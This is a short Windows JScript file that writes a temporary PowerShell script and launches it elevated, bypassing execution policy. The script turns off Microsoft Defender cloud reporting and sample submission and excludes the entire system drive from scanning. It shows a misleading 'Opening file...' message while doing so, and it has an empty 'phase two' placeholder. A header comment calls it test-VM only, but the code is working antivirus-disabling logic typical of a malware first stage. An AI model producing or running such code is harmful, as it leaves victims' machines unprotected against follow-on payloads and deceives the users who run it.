// run-defender-keep-open.js
// Writes a temporary PowerShell script and launches it elevated with -NoExit so the PS window stays open.
// WARNING: Changes Defender settings and adds exclusion for system drive. Use only in test VM.

var shell = new ActiveXObject("WScript.Shell");
var fso = new ActiveXObject("Scripting.FileSystemObject");

// Build temp PS file path
var tempFolder = shell.ExpandEnvironmentStrings("%TEMP%");
var psFilename = "apply_defender_temp_" + (new Date().getTime()) + ".ps1";
var psPath = tempFolder + "\\" + psFilename;

// PowerShell script content (robust with try/catch and readable output)
var psContent =
'Write-Output "Opening file...";\n' +
'Set-MpPreference -MAPSReporting 0;\n' +
'Set-MpPreference -SubmitSamplesConsent 2;\n' +
'Add-MpPreference -ExclusionPath $env:SystemDrive -ErrorAction Stop;\n' +
'\n';

// Write the PS script to temp
try {
    var file = fso.CreateTextFile(psPath, true);
    file.Write(psContent);
    file.Close();
} catch (e) {
    shell.Popup("Failed to write temp PowerShell script: " + e.message, 8, "Error", 16);
    WScript.Quit(1);
}

// Build command that starts an elevated PowerShell to run the PS file with -NoExit
// We use Start-Process ... -Verb RunAs so the user gets the UAC prompt and the PS window stays visible.

var elevateCmd = "powershell -NoProfile -Command \"Start-Process -FilePath 'powershell' -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File \\\"" + psPath + "\\\"' -Verb RunAs\"";


try {
    shell.Run(elevateCmd, 1, false); // show window; do not wait (PS will stay open)
} catch (e) {
    shell.Popup("Failed to launch elevated PowerShell: " + e.message, 8, "Error", 16);
    WScript.Quit(1);
}
// phase two


// If you want the temp file removed after the PS window closes, you can add a cleanup step manually.
WScript.Quit(0);











